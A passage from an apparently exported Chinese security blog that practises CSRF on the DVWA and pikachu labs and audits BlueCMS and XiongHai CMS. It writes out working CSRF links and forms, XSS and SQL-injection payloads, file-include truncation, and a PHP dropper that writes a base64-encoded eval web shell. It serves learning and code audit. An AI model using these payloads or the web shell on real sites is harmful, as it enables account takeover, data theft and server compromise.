value=\"ç&amp;#161;&amp;#174;å&amp;#174;&amp;#154;\" />\n      &lt;input type=\"submit\" value=\"Submit request\" />\n    &lt;/form>\n  &lt;/body>\n&lt;/html>\n\n\n复制到文件中并命名为beescms.html\n管理员添加成功\n靶场实战DVWAlow发现输入修改密码界面，随便输入一下尝试发现url变化，说明是GET传参，我们可以进行自己构造payload\nhttp://127.0.0.1:8080/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#\n访问直接修改了密码，这里的话可见应该是没有什么防护的，但是这个的话在实战中也太明显了，就算构造出了链接，受害者一眼就能看出来这个是修改密码的，也就意味着无法实现CSRF了，这个时候我们该怎么办呢，可以用短链接来缩短链接，给它伪装一下，短链接生成网址https://www.duanlianjie.net/访问这个网址，观察url变化\n成功修改密码。此时来看一下源代码\n\n&lt;?php\n\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n    // Get input\n    $pass_new  = $_GET[ 'password_new' ];\n    $pass_conf = $_GET[ 'password_conf' ];\n\n    // Do the passwords match?\n    if( $pass_new == $pass_conf ) &#123;\n        // They do!\n        $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n        $pass_new = md5( $pass_new );\n\n        // Update the database\n        $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n        $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\n        // Feedback for the user\n        echo \"&lt;pre>Password Changed.&lt;/pre>\";\n    &#125;\n    else &#123;\n        // Issue with passwords matching\n        echo \"&lt;pre>Passwords did not match.&lt;/pre>\";\n    &#125;\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n\n?>\n不难看出代码中的过滤方式是mysqli_real_escape_string函数，这个函数的作用是转义特殊字符，那么在这里的话它对CSRF是没有影响的，这里的话其实还有一种攻击方式，就是利用burpsuite自带的CSRF poc进行构造，具体过程如下我们先随便输入一下，然后抓包利用burpsuite自带的CSRF工具进行构造放入html文件中，而后访问（此时携带了刚刚在dvwa中的cookie）\n成功修改\nmedium看一下源代码\n\n&lt;?php\n\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n    // Checks to see where the request came from\n    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) &#123;\n        // Get input\n        $pass_new  = $_GET[ 'password_new' ];\n        $pass_conf = $_GET[ 'password_conf' ];\n\n        // Do the passwords match?\n        if( $pass_new == $pass_conf ) &#123;\n            // They do!\n            $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n            $pass_new = md5( $pass_new );\n\n            // Update the database\n            $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n            $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\n            // Feedback for the user\n            echo \"&lt;pre>Password Changed.&lt;/pre>\";\n        &#125;\n        else &#123;\n            // Issue with passwords matching\n            echo \"&lt;pre>Passwords did not match.&lt;/pre>\";\n        &#125;\n    &#125;\n    else &#123;\n        // Didn't come from a trusted source\n        echo \"&lt;pre>That request didn't look correct.&lt;/pre>\";\n    &#125;\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n\n?>\n添加了Refeerer头检验，这个的话是要求来自同一个域，其实也就是要求访问的必须是本地的，但Referer请求头是可以伪造的，具体过程如下简单输入抓包\n这里的话可以看见本地的Referer是127.0.0.1，和Host的是一致的，但正常的情况下是不一致的，Host一般是受害者的，而Referer来源于攻击者\n\n\n\n\n\n\n\n\n\n比如Host的地址为192.134.164.132，这个时候攻击者的ip肯定是与Host的不同的，假设是186.123.134.265，这个时候如果请求的话，Referer是http://186.123.134.265，就会因为Referer中不包含192.134.164.132 而无法修改密码，但如果我们文件名包含这个Host地址，那Referer就会变成http://186.123.134.265/192.134.164.132.html，此时就包含了Host地址，就可以成功修改密码，实现CSRF\n说了这么多，我们现在来自己进行测试一下，利用burpsuite构造出POC\n构造一个html文件，然后将内容复制进去点击访问成功修改密码，实现CSRF\nHigh\n&lt;?php\n\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n    // Check Anti-CSRF token\n    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n\n    // Get input\n    $pass_new  = $_GET[ 'password_new' ];\n    $pass_conf = $_GET[ 'password_conf' ];\n\n    // Do the passwords match?\n    if( $pass_new == $pass_conf ) &#123;\n        // They do!\n        $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n        $pass_new = md5( $pass_new );\n\n        // Update the database\n        $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n        $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\n        // Feedback for the user\n        echo \"&lt;pre>Password Changed.&lt;/pre>\";\n    &#125;\n    else &#123;\n        // Issue with passwords matching\n        echo \"&lt;pre>Passwords did not match.&lt;/pre>\";\n    &#125;\n\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n\n// Generate Anti-CSRF token\ngenerateSessionToken();\n\n?>\n可以发现多了这个generateSessionToken()函数，这个是用来生成token的，具体介绍如下\nAnti-CSRF token机制，用户每次访问该页面时，服务器都会返回一个随机的token（generateSessionToken();），向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token,只有token正确，才会处理客户端的请求。\n\n这里的话我们有两种方式\n方法一借助XSS来获取token，这个网页中有一个high的xss漏洞，如果我们通过xss得到token，此时就可以按照之前的方法来进行CSRF了，打开存储型XSS，发现这里限制了输入长度，F12修改一下即可测试后发现过滤了script，这里的话我们可用其他标签获取token\n&lt;iframe src=\"../csrf/\" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>\n输入后提交，刷新界面就会出现此时的token这时候按照之前的方法进行CSRF即可，在提交的时候额外带上一个CSRF就可以了\n方法二正常情况下抓包后发包，由于token更新，这个已经失效，访问会变成302这时候利用burpsuite中的CSRF插件来进行攻击(这个插件可以自动更新token)。在拓展中找到CSRF Token Tracker安装一下，打开它添加Host和对应的token名此时再重放成功修改密码，实现CSRF\npikachuGET登录后查看一下看一下可以修改的信息发现可以修改的name值，这个时候我们就可以自己构造语句来进行修改信息，构造payload如下\nhttp://127.0.0.1:8080/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=静一静&amp;phonenum=全体目光向我看齐&amp;add=我宣布个事&amp;email=你是个纱布&amp;submit=submit\n简单修改一下的话就变成了\n&lt;a href=\"http://127.0.0.1:8080/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=静一静&amp;phonenum=全体目光向我看齐&amp;add=我宣布个事&amp;email=你是个纱布&amp;submit=submit\">虎哥的东北往事，点击了解&lt;/a>\n在能解析HTML的界面上就会变成这样当把这个放在公网上，受害者点击后就会自动修改个人信息，如下所示此时就达到了CSRF的目的\nPOST对于POST提交的话，这个我们就需要构造html表单了，这个时候就可以借助burpsuite来实现具体步骤如下登录后在修改信息处点submit时抓包右键发送到重放模块修改信息构造poc放至到一个html文件中，当受害者访问时，出现界面点击后就会发现信息就会被修改\ntoken这个可以利用burpsuite的CSRF获取token插件来进行攻击，具体步骤如下在拓展中找到CSRF Token Tracker(作用是自动识别并更新token)安装后打开，添加Host和name然后抓包发送到重放模块，修改信息此时再查看界面\n成功修改了信息，实现CSRF\n总结CSRF的话目前已经不会单独出现了，想要利用的话经常要结合XSS这种，这里主要是学习一下大致思路，待日后遇到具体的CSRF漏洞时，再进行记录。若文章有不当之处，还请各位大师傅多多指教。\n参考文献https://tttang.com/archive/1246/#toc_0x03-csrfhttps://tech.meituan.com/2018/10/11/fe-security-csrf.htmlhttps://xz.aliyun.com/t/7297https://xz.aliyun.com/t/8186https://en.wikipedia.org/wiki/Cross-site_request_forgery\n","slug":"记一次CSRF的浅学习","date":"2022-07-22T10:50:30.000Z","categories_index":"WEB知识","tags_index":"CSRF","author_index":"quan9i"},{"id":"18629f2c244b07dcae82afe166d98af9","title":"从多个基础CMS入坑代码审计","content":"代码审计概念什么是代码审计？\n代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题，请见谅)\n分类代码审计的话大致分为三种，白盒、黑盒和灰盒\n白盒测试较为官方的定义\n已知产品的内部工作过程，可以进行测试证明每种内部操作是否符合设计规格要求，所有内部成分是否经过检查。\n其实这种测试的话就是你可以看到源代码，直接从代码中来看哪里可能出现问题，然后进行检测，此时你是知道内部结构的，测试相对黑盒测试会比较容易一点\n黑盒测试较为官方的定义\n已知产品的功能设计规格，可以进行测试证明每个实现了的功能是否符合要求。\n其实黑盒测试的话就是你只知道网页的大致结构，然后对各个功能开始检测，按自己的思路进行测试，比如看到留言界面，测试XSS，看到登录界面，测试SQL注入这种\n灰盒测试灰盒测试是介于白盒测试与黑盒测试之间，自己测试的同时结合代码来看。一般代码审计的话都是类似于这种灰盒测试的。\n如何代码审计了解CMS结构每个CMS都拥有数以百计的文件，这个时候我们该如何审，从哪里审呢，这个时候就要关注重要点，以这里的bluecms为例这里有多个文件及文件夹，该从何入手呢，首先就从文件夹的名字入手，因为程序员在开发时一般不会随意起名，对应的文件夹名一般都是有作用的，例如这里的install就是安装目录，具体分类大致如下\n\n\n\n\n\n\n\n\n\n├── admin     后台管理目录├── install   网站的安装目录├── api       接口文件目录├── data     系统处理数据相关目录├── include  用来包含的全局文件└── template  模板\n同时它还有(1)函数集文件，它的定义如下\n这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。\n(2)配置文件，它的定义如下\n这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。\n寻找关键词大致的分类的话就如下所示\n命令执行\tsystem、shell_exec、passthru、popen、proc_open\n文件包含\trequire、include、require_once、include_once\n变量覆盖\tparse_str 、mb_parse_str\n代码执行\teval、assert、preg_replace\n文件操作\tfile_get_contents 、file_put_contents 、move_uploaded_file 、unlink &amp; delete\n这些是大致的关注点，但是如果自己去找的话一般这么多的文件，一个个ctrl+f寻找关键词也是比较慢的，因此一般的话是借用工具的，但工具不是百分百灵验的，我们需要结合自己的判断来看它是否真的存在漏洞，一会介绍一下工具，现在先具体的介绍一下这些关注点\nSQL注入关键词SQL注入，关注点就是SELECT xxx From xxx WHERE xxx以及UPDATE xxx SET xxx WHERE xxx这些字词，当出现这些的时候，才有可能出现SQL注入。同时还要关注character_set_connect=&#39;gbk&#39;这种语句，出现它时可能会出现宽字节注入。\n例如\n$ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n$db->query(\"UPDATE \".table('article').\" SET comment = comment+1 WHERE id = \".$id);\nXSS关键词XSS常见地是留言板，新闻编辑处这些可以写入内容的地方，同时我们可以结合之前存在的漏洞进行尝试XSS。\n任意文件删除关键词这类在修改头像、修改内容时可能比较常见，然后一般我们就可以去这类文件下看它是否有unlink函数，如果有的话就可能存在任意文件删除漏洞\n工具我们一般自己去找的话有点慢，效率不高，但代码审计有应用可以帮助我们进行代码审计，常见的是Seay源代码审计系统，seay工具链接如下https://github.com/f1tz/cnseay我们关注的SQL注入，我们就可以去搜索SELECT以及UPDATE对应的任意文件删除漏洞，我们就去搜索unlink函数这个时候就可以直接定位到利用函数的语句中，相比自己找要快捷很多，同时Seay代码审计具有自动代码审计的功能，用它也是蛮方便的。下面开始审计\nbluecms环境配置这个CMS是比较简单的一个，源码链接如下https://github.com/source-trace/bluecms我的环境配置是phpstudy 2018 5.5.38+mysql5.5.53，不要用7+这种高版本的php，因为这个cms是比较老的，它的部分函数与新版本php两者是不相匹配的，然后搭建好后访问bluecms-master/install/，这个时候可能界面是空白，我们需要开启一下允许目录列表然后去删除bluecms-master\\install\\compile下的php文件此时再去重新访问install按照步骤配置即可，但是到step=5时又变成空白了，不过这个时候已经搭建好了，访问bluecms-master/index.php就可以发现已经配置成功\n工具扫描使用seay工具进行扫描扫描这个cms后得到很多数据开始挨个进行分析\nSQL注入ad_js.php跟进第一条包含了common.inc.php文件，跟进查看这个文件if语句中有一个get_magic_quotes_gpc函数，查看这个get_magic_quotes_gpc函数这么看的话其实就是相当于if语句中始终为1，那也就是说它对GET POST COOKIES REQUEST这些请求的参数加上了deep_addslashes函数，此时跟进这个函数进行查看可以发现这里其实就是加上了addslashes函数，而这个函数呢是对单引号、双引号、反斜线加上\\进行转义的，因此这里其实就是限制了单引号、双引号、反斜线的使用，防止SQL注入\n再回到最开始，发现注入参数是ad_id，观察代码可以看出它对ad_id参数先进行了trim()过滤，也就是过滤了参数中的空白字符，例如空格 \\t \\r \\n这些，之后呢进行了SQL注入查询语句，参数两边是没有加单引号的，看起来是可以进行SQL注入的，此时发现getone函数，我们跟进这个函数进行查看从这里看出它这个函数是将结果取出的，因此这里的话我们总结一下，它就是一个SQL查询语句，我们可以控制where ad_id=xxx这一部分，同时它有这个单引号过滤函数，但是这里变量是没有被单引号包裹的，所以这里这个函数其实是无效的，而且这个结果有回显，会返回结果，我们此时就可以尝试在此界面进行SQL注入访问bluecms-master/ad_js.php,先看一下字段数\nad_id=-1 order by 7\nad_id=-1 order by 8\n当是7的时候无回显，为8的时候报错，说明字段数为7，接下来尝试联合查询\n-1 union select 1,2,3,4,5,6,7\n看起来是无回显的，但当我们去查看源代码时就会发现是有回显的，不过加了注释因此这里的这个7就是回显位，接下来开始注入即可\n//查库\n-1 union select 1,2,3,4,5,6,database()\n//查表\n-1 union select 1,2,3,4,5,6,(select group_concat(table_name)  from infromation_schema.tables where table_schema=database()\n当然这里这个查表也可以用十六进制来进行绕过我这里的数据库名是root，对其进行十六进制加密后为726f6f74，加上0x使得能够被识别为十六进制数，构造payload如下\n//查表\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(table_name)  from information_schema.tables where table_schema=0x726f6f74)\n//查列(以blue_user为例)\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(column_name)  from information_schema.columns where table_name=0x626c75655f75736572)\n//查字段\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(user_id,0x7e,user_name,0x7e,pwd)  from blue_user)\n\nann.php（失败）只看这个SELECT语句的话，确实是没有什么过滤的，看起来可以进行SQL注入但是看最上面的传值处就会发现这两个在有值时，结果是intval函数包含后的，我们测试一下这个函数\n&lt;?php\n$a=$_REQUEST['a'];\necho intval($a);\n?>\n可以发现字母都被pass了，因此这里的话，就没办法进行SQL注入了G，下一个。\ncomment.php（失败）打开发现这个SELECT语句中id变量是无单引号包裹的id如果没有被过滤的话，就存在可注入点，看id传值处id添加了intval函数，因此这个参数是无法进行注入了，此时这个type也同理，限制了值只能是0或1，这个act的话限制了只能为list或者send，而且它不在查询语句这种里面，在这个文件里没有用到，因此也是可以判定为没戏的，所以这个文件也G\nuser.php(失败)按照seay审计系统的来，发现这个有select语句，但是它的变量都是有单引号包裹的在最上方看看包含的文件发现包含有这个common.inc.php文件，而这个文件中有过滤单引号的函数，因此这里不存在SQL注入。\n下一处这里的id变量未被单引号包裹，但它在传值时添加了intval函数，这意味着字符串无法上传，因此这个也是无法成功注入的。PASS\nXSSad_js.php这个ad_id变量可控，而且它没有单引号包裹，那不就意味着我们可以随意构造后面的语句，不仅仅是SQL注入，XSS应该也是可以的，我们构造payload如下\n1 &lt;script>alert(/quan9i/)&lt;/script>\n\nuser.php\nelseif ($act == 'do_add_news') &#123;\n\tinclude_once 'include/upload.class.php';\n\t$image = new upload();\n\t$title = !empty($_POST['title']) ? htmlspecialchars(trim($_POST['title'])) : '';\n\t$color = !empty($_POST['color']) ? htmlspecialchars(trim($_POST['color'])) : '';\n\t$cid = !empty($_POST['cid']) ? intval($_POST['cid']) : '';\n\tif(empty($cid))&#123;\n\t\tshowmsg('���ŷ��಻��Ϊ��');\n\t&#125;\n\t$author = !empty($_POST['author']) ? htmlspecialchars(trim($_POST['author'])) : $_SESSION['admin_name'];\n\t$source = !empty($_POST['source']) ? htmlspecialchars(trim($_POST['source'])) : '';\n$content = !empty($_POST['content']) ? filter_data($_POST['content']) : '';\n$descript = !empty($_POST['descript']) ? mb_substr($_POST['descript'], 0, 90) : mb_substr(html2text($_POST['content']),0, 90);\n\tif(isset($_FILES['lit_pic']['error']) &amp;&amp; $_FILES['lit_pic']['error'] == 0)&#123;\n\t$lit_pic = $image->img_upload($_FILES['lit_pic'],'lit_pic');\n这里发现title和color添加了转换HTML实体函数，因此是可以确定是不存在XSS的，下面亦是如此，但我们发现包含content的函数是不同的，它是filter_data函数包裹的，跟进这个函数看看\n函数如下\nfunction filter_data($str)\n&#123;\n\t$str = preg_replace(\"/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*>/\", \"\", $str);\n\treturn $str;\n&#125;\n发现过滤了常用的xss标签，但仍存在其他的xss标签，如\n&lt;img src=1 onerror=alert(1)>\n&lt;a href=javascript:alert(1)>&lt;/a>\n&lt;svg onload=alert(1)>\n&lt;button onclick=alert(1)>\n\n此时这个应该是有可能的，我们看后面他还有没有过滤可以发现这个SQL语句直接将这个content给写进去了，那这里就应该是存在XSS的，我们尝试构造一下这里加*的应该是必选项，那我们就只写这几个即可，构造payload如下点击编辑成功触发XSS\nguest_book.php在看前台的时候发现有一个留言的界面，点击访问，url跳转到了guest_book.php下，查看源码可以发现这个里面的内容加上了HTML实体标签，因此内容实现XSS是没戏，而且在开头可以发现包含了一个文件这个文件里面对单引号进行了转义，这里的话还剩一个变量是page_id，可以发现这个参数是没有被单引号或者双引号包裹的，然后我们看一下包含它的showmsg函数也并未对这个id进行过滤，说明这里可能有戏，我们先正常上传一个123试试上传后没有异常，查看界面源代码找到我们的page_id变量，这里就可以发现是被input标签中value属性包含的，如果我们可以摆脱这个，那么就可以实现xss，那这个时候我们闭合双引号，先写一个&quot;，再闭合标签，用&gt;，而后加上我们的xss语句&lt;scipt&gt;alert(1)&lt;/script&gt;即可，此时我们想到开头不是有一个转义双引号的吗，但是我们看一下这里此时的语句\nvalue=\"\\\">&lt;script>alert(1)&lt;/script>\"\n这个\\正好被当做了value的值，双引号还是起到作用了，此时我们来传值进行尝试成功XSS\n文件包含user.phpseay审计代码系统扫描中发现一个文件包含漏洞\n跟进进行查看发现这里在上过pay之后直接进行了包含，如果版本号低的话，应该是可以利用%00截断\n\n\n\n\n\n\n\n\n\n%00截断magic_quotes_gpc=off，PHP小于5.3.4\n还有路径长度截断\n\n\n\n\n\n\n\n\n\n路径长度截断Linux 需要文件名长于 4096，Windows 需要长于 256\n但在这里测试%00截断行不通，尝试路径长度截断可行这里的php文件是本地的，那我们该如何去上传一个文件来getshell呢发现user下有一个上传头像的，如果这个文件名可控的话，那么就可以getshell了发现此时给出了文件名包含一下同时传值进行尝试成功，还有一种方式，因为这里的话是include一个文件，我们知道include文件的话，就会执行这个文件里的语句，那我们就可以让他包含一个文件，然后这个文件里写入我们的小木马即可，示例如下这个是1.php\n&lt;?php\ninclude(\"qq.php\");\n?>\n然后这个是qq.php\n&lt;?php @fputs(fopen('shell.php','w'),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'));?>\n//PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+为&lt;?php @eval($_POST[1])?>\n然后我们去访问1.php此时再看这个文件夹下成功写入，原理就是这样。此时我们再来看这里，我们传入的方式的话就是上传头像，我们将我们php文件改为jpg而后上传，内容依旧是写入shell.php，其内容为一句话木马\n&lt;?php @fputs(fopen('shell.php','w'),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'));?>\n\n此时还需要进行一下文件包含，我们去查看一下当前的头像路径此时去包含它，用刚刚路径长度截断的姿势即可此时去查看shell.php，如果界面空白则应该是上传成功蚁剑连接\n任意文件删除这种的话一般是找unlink函数，这个函数是删除文件的，可能存在任意文件删除漏洞，这里的话我门用seay代码审计工具来进行查看跟进user.php查看\nuser.phpid参数(失败)看起来的话是没有什么过滤的，不过前面有个query函数，跟进查看一下\n可以发现当它查询这个id在结果中没有的时候，它就会把错误返回，那这个时候就无法继续运行了，而我们如果想实现任意文件删除的话，变量id肯定是要写成文件名的，那这个时候无法往下运行，这个也就无法实现任意文件删除，因此这个实现不了任意文件删除\nface_pic3参数这个有多个参数中涉及了unlink函数，我们挨个进行查看这里的话可以发现这个face_pic3是在unlink函数下的，跟进这个变量会发现也只在这里提及，因此这里的话不存在过滤，此时如果这个else语句能执行，我们就可以通过控制这个变量来实现任意文件删除，此时看看上面语句它是在act变量为edit_user_info下的，因此我们令act为edit_user_info即可，而后发现这些变量不传不会跳出，我们就不填这些变量即可，然后来到这个if-else语句，为了让else语句执行，所以if的条件是不能满足的，if里的条件是face_pic1不为空，我们这里让它为空就可以执行else语句，因此按理说直接post传face_pic3就可以实现任意文件删除，尝试我们这里本地是有shell.jpg的，我们删除它来试试发包成功实现。\nlit_pic参数发现这个lit_pic变量然后跟进变量的话发现它是只出现在这里的，这意味着它这个变量是没有其他过滤的，这里我们也不需要输入单引号或者双引号，直接让lit_pic等于我们想删除的文件夹名即可实现任意文件删除，但是要实现这个，肯定需要满足上面的条件，这样才能往下进行，因此我们从上面的语句开始看只有这个首先满足这个，所以我们就需要写title变量姓名和电话，这意味着link_man和link_phone也是需要填写的，还有开始的变量lit_pic,这里post传入的也就是四个变量，这个时候先看看我们本地的文件可以发现是有shell.php的，我们尝试删除它，即让lit_pic的值为它此时查看本地成功实现了任意文件删除\n熊海cms环境搭建下载地址https://down.chinaz.com/soft/36930.htm安装后访问install界面填写完成过后点确定即可此时再访问index.php配置完成\n了解CMS结构结构如下对应功能如下\n\n\n\n\n\n\n\n\n\nadmin         –管理后台文件夹css           –存放css的文件夹files         –存放页面的文件夹images        –存放图片的文件夹inc           –存放网站配置文件的文件夹install       –网站进行安装的文件夹seacmseditor  –编辑器文件夹template      –模板文件夹upload        –上传功能文件夹index.php     –网站首页\n工具扫描发现存多个漏洞，包括SQL注入和任意文件包含等，下面开始进行分析\n文件包含index.php源码如下\n&lt;?php\n//单一入口模式\nerror_reporting(0); //关闭错误显示\n$file=addslashes($_GET['r']); //接收文件名\n$action=$file==''?'index':$file; //判断为空或者等于index\ninclude('files/'.$action.'.php'); //载入相应文件\n可以发现这里没有包含什么文件，开始看代码。这个的话是get传参了一个变量r，这个r被addslashes函数包裹然后把这个值赋给了file变量，此时有个三元运算符，如果变量file为空就令file等于index同时赋值给action变量，否则就令变量file为变量r的值，然后赋值给action变量此时包含了这个action变量，在action前后进行了拼接。\n这里的代码就读到这就结束了，然后我们需要了解一下这个addslashes函数\naddslashes — 使用反斜线引用字符串\n该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）。 \n也就是说对单引号、双引号、反斜线和NUL进行了转义，这里的话我们的路径一般用的是./这些，不受影响，因此这里的话我们先在本地放一个1.php文件，写入phpinfo()传一下看看是否能成功上传成功\n那如果不是php文件的话，这里该怎么进行利用呢，这个时候就用到了路径长度截断，在bluecms中也曾利用过，这里我们再次尝试先在本地放一个txt文件内容为phpinfo即可，具体如下采用路径长度截断(.号长度大于256即可)注\n但这个经过测试，只有在php版本为5.2.17时可以成功，其他情况都不行\n这个的话是可以成功进行文件包含的，看下一处\nadmin/index.php&lt;?php\n//单一入口模式\nerror_reporting(0); //关闭错误显示\n$file=addslashes($_GET['r']); //接收文件名\n$action=$file==''?'index':$file; //判断为空或者等于index\ninclude('files/'.$action.'.php'); //载入相应文件\n?>\n代码同上，这里肯定也可以进行文件包含，思路同上即可，不再演示\nSQL注入这种的话可以先测测登录点，一般都是admin，这种登录框的可能会出现SQL注入，先测试一下是否是单引号闭合的\n报错，有戏既然报了个错，那就用个报错注入好了爆库\n1' and (extractvalue(1,concat(0x7e,(select database()  limit 1,1),0x7e)))#\n爆表\n1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#\n\n后面按照常规注入即可，此时看看后端代码\n&lt;?php \nob_start();\nrequire '../inc/conn.php';\n$login=$_POST['login'];\n$user=$_POST['user'];\n$password=$_POST['password'];\n$checkbox=$_POST['checkbox'];\n\nif ($login&lt;>\"\")&#123;\n$query = \"SELECT * FROM manage WHERE user='$user'\";\n$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$users = mysql_fetch_array($result);\n\nif (!mysql_num_rows($result)) &#123;  \necho \"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>\";\nexit;\n&#125;else&#123;\n$passwords=$users['password'];\nif(md5($password)&lt;>$passwords)&#123;\necho \"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>\";\nexit;\t\n发现user是没有进行过滤的，直接放入了select语句中，造成了SQL注入\nadmin/files/adset.php(失败)&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$setopen='class=\"open\"';\n$query = \"SELECT * FROM adword\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$ad = mysql_fetch_array($resul);\n\n$save=$_POST['save'];\n$ad1=addslashes($_POST['ad1']);\n$ad2=addslashes($_POST['ad2']);\n$ad3=addslashes($_POST['ad3']);\nif ($save==1)&#123;\n$query = \"UPDATE adword SET \nad1='$ad1',\nad2='$ad2',\nad3='$ad3',\ndate=now()\";\n可以看到这里的话有这个 &quot;UPDATE adword SET  ad1=&#39;$ad1&#39;语句，我们这里可控的变量是ad1，但ad1被单引号包裹了，我们如果想要进行SQL注入的话肯定需要闭合单引号，此时我们看ad1的传入方式，发现$ad1=addslashes($_POST[&#39;ad1&#39;]);，它被这个addslashes函数包裹了，这就意味着我们的单引号输入后会被转义，那也就无法闭合之前的语句，因此无法实现SQL注入，这里是误报了属于是\nadmin/files/editcolumn.php部分代码如下\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$columnopen='class=\"open\"';\n$id=$_GET['id'];\n$type=$_GET['type'];\n\nif ($type==1)&#123;\n$query = \"SELECT * FROM nav WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$nav = mysql_fetch_array($resul);\n&#125;\nif ($type==2)&#123;\n$query = \"SELECT * FROM navclass WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$nav = mysql_fetch_array($resul);\n&#125;\n这里我们可以看见到这个id参数是可控的，虽然它被包裹在单引号中，但id的传参是直接get传参的，此时就剩下两个开头的包含文件了，如果包含的文件是没有过滤的话，那这里应该就是可以进行SQL注入的，查看这两个文件conn.php内容如下\n&lt;?php\n\terror_reporting(0);\n\theader('Content-Type:text/html;charset=utf-8');\n\trequire 'conn.info.php';\n\t//常量参数\n\tdefine('DB_HOST',$DB_HOST);\n\tdefine('DB_USER',$DB_USER);\n\tdefine('DB_PWD',$DB_PWD);\n\tdefine('DB_NAME',$DB_NAME);\n\t\n\t//第一步，连接MYSQL服务器\n\t$conn = @mysql_connect(DB_HOST,DB_USER,DB_PWD) or die(header('Location: /install'));\n\t\n\t//第二步，选择指定的数据库，设置字符集\n\tmysql_select_db(DB_NAME) or die('数据库错误，错误信息：'.mysql_error());\n\tmysql_query('SET NAMES UTF8') or die('字符集设置错误'.mysql_error());\n\tdate_default_timezone_set('PRC'); //设置中国时区\n?>\n连接数据库的文件，再查看另一个checklogin.php内容如下\n&lt;?php\n$user=$_COOKIE['user'];\nif ($user==\"\")&#123;\nheader(\"Location: 